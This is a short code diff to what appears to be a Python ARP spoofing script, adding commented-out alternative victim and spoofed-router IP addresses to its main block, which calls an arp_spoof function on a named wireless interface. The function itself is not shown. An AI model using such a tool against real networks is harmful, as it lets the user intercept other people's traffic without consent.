@@ -36,7 +36,11 @@ def arp_spoof(target_ip, spoof_ip, iface=None):
 
 if __name__ == "__main__":
     victim_ip = "192.168.115.31"          # in wireshark: arp
+    #victim_ip = "192.168.10.108"
+
     spoof_ip = "192.168.115.43"           # The IP you’re pretending to be / ROUTER
+    #spoof_ip = "192.168.10.75"
+
     iface = "MediaTek Wi-Fi 6E MT7902 Wireless LAN Card"
 
     arp_spoof(victim_ip, spoof_ip, iface=iface)
